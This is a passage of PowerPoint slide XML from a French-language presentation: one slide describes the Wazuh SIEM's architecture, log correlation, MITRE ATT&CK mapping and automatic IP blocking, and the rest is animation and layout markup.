                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="267"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="54" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="267"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="55" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="269"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="57" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="269"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="58" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="59" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="273"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="60" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="273"/>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272"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="63" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="272"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="64" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="65" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="274"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="66" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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animBg="1"/>
      <p:bldP spid="241" grpId="0"/>
      <p:bldP spid="242" grpId="0"/>
      <p:bldP spid="247" grpId="0"/>
      <p:bldP spid="248" grpId="0"/>
      <p:bldP spid="260" grpId="0"/>
      <p:bldP spid="261" grpId="0"/>
      <p:bldP spid="262" grpId="0" animBg="1"/>
      <p:bldP spid="264" grpId="0"/>
      <p:bldP spid="265" grpId="0"/>
      <p:bldP spid="266" grpId="0"/>
      <p:bldP spid="267" grpId="0" animBg="1"/>
      <p:bldP spid="269" grpId="0"/>
      <p:bldP spid="270" grpId="0"/>
      <p:bldP spid="271" grpId="0"/>
      <p:bldP spid="272" grpId="0" animBg="1"/>
      <p:bldP spid="27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2" name="Google Shape;212;p12"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>centraliser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>détecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>réagir</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="213" name="Google Shape;213;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5212080" cy="4114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42857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Architecture Manager / Agent / Indexer / Dashboard</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1100"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Corrélation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>journaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>niveaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>sévérité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> (0 → 15+)</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1100"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Cartographie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> native MITRE ATT&amp;CK</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1100"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Réponse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> active : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>blocage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> sans intervention humaine</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5952744" y="1545336"/>
            <a:ext cx="5742432" cy="2724024"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2350"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E5E"/>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5" name="Google Shape;215;p12" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig10_wazuh_dashboard.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6050585" y="1579276"/>
            <a:ext cx="5592470" cy="2649380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5870448" y="4269360"/>
            <a:ext cx="5742432"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Tableau de bord </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>fonctionnement</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="Google Shape;217;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="258775" y="4486180"/>
            <a:ext cx="11109960" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8696"/>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12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4521264"/>
            <a:ext cx="1060704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1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Chaîne de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>validée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de bout </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> bout :</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p12"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>13</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{36AFD662-2AC6-B8FF-A9D7-D12F48F19915}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="579120" y="169514"/>
            <a:ext cx="6961548" cy="580644"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{835EF2A2-4D0F-6544-DE5E-11F337139A56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
